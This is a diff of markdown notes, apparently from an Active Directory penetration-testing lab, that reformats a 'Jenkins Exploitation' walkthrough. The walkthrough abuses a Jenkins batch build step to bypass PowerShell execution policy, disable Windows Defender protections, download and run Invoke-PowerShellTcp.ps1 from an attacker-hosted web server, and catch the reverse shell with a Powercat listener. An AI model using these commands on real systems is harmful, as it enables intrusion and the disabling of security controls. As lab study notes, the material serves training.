@@ -307,22 +307,26 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ![08fdb504a7aa7b3842efb89e8f3b3c66.png](../../_resources/59f4278f7c8c4214a2323ddee7bf5ca7.png)
 
 # Jenkins Exploitation:
-1.	Edit Invoke-PowerShellTcp.ps1 to include a function call at the bottom of script with what you where you would like the shell to go. Make sure the functions call matched whatever it is declared as in the beginning of the script.
+- Edit Invoke-PowerShellTcp.ps1 to include a function call at the bottom of script with what you where you would like the shell to go. Make sure the functions call matched whatever it is declared as in the beginning of the script.
 
 ![ce1df797182a562799724684b5f401a6.png](../../_resources/7170f3068e9d467fbf06465d46c894b9.png)
 
-2.	Pick a project to play with…and add Build Steps with the Execute Windows batch command option….disable the protections and then grab your script from the webserver that you are hosting it on. Save your changes.
-a.	Powershell -ep bypass
-b.	Powershell Set-MpPreference -DisableRealtimeMonitoring $true
-c.	Powershell Set-MpPreference -DisableIOAVProtection $true
-d.	Powershell iex (iwr http://172.16.x.x/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
+- Pick a project to play with…and add Build Steps with the Execute Windows batch command option….disable the protections and then grab your script from the webserver that you are hosting it on. Save your changes.
+	- Powershell -ep bypass
+	- Powershell Set-MpPreference -DisableRealtimeMonitoring $true
+	- Powershell Set-MpPreference -DisableIOAVProtection $true
+	- Powershell iex (iwr http://172.16.x.x/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
 
 ![5271e97c057a0379498c84536edbf822.png](../../_resources/cabb0c5a33a84b4a9524fe81b0134b7e.png)
-3.	Spin up your webserver and a listener. Powercat -l -v -p 53 -t 1000; In linux using rlwrap with netcat will work. 
+
+- Spin up your webserver and a listener. Powercat -l -v -p 53 -t 1000; In linux using rlwrap with netcat will work. 
 
 ![30d8fa32713391c2813b91d4f551864a.png](../../_resources/9b6e8249c8d8457ab5a8739f9ccda2b5.png)
+
 ![3b7117b78e82c2828fbb3a5ce2d70a54.png](../../_resources/2358e2c457724f5997676af6ef579d04.png)
-4.	Build the project with “Build Now” in Jenkins and win.  
+
+- Build the project with “Build Now” in Jenkins and win. 
+
 ![b2bdb6535c80b54e297e13f5ef908cfe.png](../../_resources/a0e292a56f0d432f82bfe78b3c2aaf82.png)
 
 ![18701c98ff5d21866fdf5be486eca708.png](../../_resources/160011f8080d45188f523e0265c95609.png)
